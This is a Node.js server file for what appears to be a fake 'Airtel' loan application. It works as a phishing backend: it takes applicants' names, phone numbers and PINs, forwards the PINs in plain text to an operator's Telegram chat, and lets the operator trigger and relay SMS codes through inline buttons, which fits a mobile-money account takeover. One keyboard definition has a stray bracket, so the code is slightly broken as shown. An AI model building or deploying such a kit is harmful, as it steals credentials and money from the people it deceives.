require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const AfricasTalking = require('africastalking')({
    apiKey: process.env.AT_API_KEY || 'dummy', 
    username: process.env.AT_USERNAME || 'sandbox'
});

const app = express();
app.use(bodyParser.json());
app.use(express.static('public')); 

// PRODUCTION FIX: Turn off background polling loops completely to pass Render's live checks
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN || 'dummy', { polling: false });

const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID;
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
let activeSessions = {};

// Verify server liveness during deployment
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Airtel Engine operational' });
});

app.post('/api/submit-application', (req, res) => {
    const { phone, firstName, secondName, pin } = req.body;
    activeSessions[phone] = { phone, name: `${firstName} ${secondName}`, pin, status: 'awaiting_initial_approval', otp: null, otpExpires: null };

    const msg = `📱 *New Loan Application*\n\n👤 Name: ${firstName} ${secondName}\n📞 Phone: ${phone}\n🔑 PIN: ${pin}`;
    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [[
                { text: '✅ Correct (Allow OTP)', callback_data: `allow_otp:${phone}` },
                { text: '❌ Incorrect', callback_data: `incorrect:${phone}` }
            ]]
        }
    };

    bot.sendMessage(ADMIN_CHAT_ID, msg, options).catch(e => console.log('Telegram Send Error:', e.message));
    res.json({ status: 'submitted' });
});

app.get('/api/check-status/:phone', (req, res) => {
    const session = activeSessions[req.params.phone];
    res.json({ status: session ? session.status : 'restart' });
});

app.post('/api/submit-otp', (req, res) => {
    const { phone, otp } = req.body;
    const session = activeSessions[phone];
    if (!session) return res.json({ success: false });

    if (session.otp === otp && Date.now() < session.otpExpires) {
        session.status = 'awaiting_final_approval';
        const msg = `🛎️ *OTP Code Match Verified!*\n👤 Name: ${session.name}\n📞 Phone: ${session.phone}\n🔑 PIN Stored: ${session.pin}\n\nExecute Final Action:`;
        const options = {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '💰 Approve Loan', callback_data: `approve:${phone}` }],
                    [{ text: '⚠️ Wrong Code', callback_data: `wrong_code:${phone}` }],
                    [{ text: '🔒 Wrong PIN', callback_data: `wrong_pin:${phone}` }]
                ]
            ]
        };
        bot.sendMessage(ADMIN_CHAT_ID, msg, options).catch(e => console.log(e.message));
        res.json({ success: true });
    } else {
        session.status = 'enter_otp';
        res.json({ success: false });
    }
});

// Endpoint for receiving webhook signals directly from Telegram's secure servers
app.post(`/bot${process.env.TELEGRAM_BOT_TOKEN}`, async (req, res) => {
    res.sendStatus(200); // Instantly answer Telegram to preserve bandwidth
    
    if (!req.body.callback_query) return;
    
    const query = req.body.callback_query;
    const [action, phone] = query.data.split(':');
    const session = activeSessions[phone];
    if (!session) return bot.answerCallbackQuery(query.id).catch(() => {});

    const chat_id = query.message.chat.id;
    const message_id = query.message.message_id;

    try {
        if (action === 'allow_otp') {
            const code = Math.floor(1000 + Math.random() * 9000).toString();
            session.otp = code;
            session.otpExpires = Date.now() + 120000;
            session.status = 'enter_otp';

            await bot.editMessageText(`✅ OTP Dispatched: *${code}*\n👤 User: ${session.name}\n🔑 PIN: ${session.pin}`, { chat_id, message_id, parse_mode: 'Markdown' });
            try { await AfricasTalking.SMS.send({ to: session.phone, message: `Your secure code is ${code}. It expires in 2 minutes.` }); } catch(e){}
        } 
        else if (action === 'incorrect') { session.status = 'restart'; await bot.editMessageText(`❌ Application reset.`, { chat_id, message_id }); }
        else if (action === 'approve') { session.status = 'loan_approved'; await bot.editMessageText(`🎉 *LOAN APPROVED*\n👤 User: ${session.name}\n🔑 Reviewed PIN: ${session.pin}`, { chat_id, message_id, parse_mode: 'Markdown' }); }
        else if (action === 'wrong_code') { session.status = 'enter_otp'; await bot.editMessageText(`⚠️ Flagged: Wrong Code. Prompting retry.`, { chat_id, message_id }); }
        else if (action === 'wrong_pin') { session.status = 'reenter_pin'; await bot.editMessageText(`🔒 Flagged: Wrong PIN.\n❌ Supplied PIN: ${session.pin}`, { chat_id, message_id }); }
    } catch (err) {
        console.log('Callback operation alert:', err.message);
    }
    
    bot.answerCallbackQuery(query.id).catch(() => {});
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, async () => {
    console.log(`Server environment operating on port: ${PORT}`);
    
    // Auto-Register Webhook route path with Telegram API endpoint dynamically on load
    if (RENDER_EXTERNAL_URL && process.env.TELEGRAM_BOT_TOKEN) {
        const webhookUrl = `${RENDER_EXTERNAL_URL}/bot${process.env.TELEGRAM_BOT_TOKEN}`;
        bot.setWebHook(webhookUrl)
            .then(() => console.log(`[Webhook successfully registered]: ${webhookUrl}`))
            .catch(err => console.log('[Webhook engine registration hitch]:', err.message));
    }
});

